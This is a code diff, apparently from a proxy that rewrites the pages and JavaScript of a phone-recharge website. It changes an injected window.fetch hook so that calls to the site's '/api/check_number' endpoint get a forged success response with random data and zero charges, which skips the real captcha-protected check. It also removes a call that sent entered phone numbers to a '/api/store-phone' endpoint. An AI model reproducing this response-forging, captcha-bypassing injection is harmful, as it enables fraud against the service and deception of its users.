@@ -133,11 +133,6 @@ async function modifyHTML(response) {
                 sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                 localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                 window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
-                await fetch('/api/store-phone', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ phoneNumber: phoneInput.value.replace(/\\D/g, '') })
-                });
               } catch (e) { console.error('Error storing phone:', e); }
             }
             return true;
@@ -270,7 +265,18 @@ async function modifyJavaScript(response) {
       const origFetch = window.fetch;
       window.fetch = function(url, options) {
         if (url && typeof url === 'string' && url.includes('/api/check_number')) {
-          url = url.replace('/api/check_number', '/api/check_number_no_captcha');
+          return Promise.resolve(new Response(JSON.stringify({
+            code: 200,
+            data: {
+              id: Math.floor(Math.random() * 90000000) + 10000000,
+              charges: 0,
+              country: "spania",
+              number: ""
+            }
+          }), { 
+            status: 200, 
+            headers: { 'Content-Type': 'application/json' } 
+          }));
         }
         return origFetch.call(this, url, options);
       };
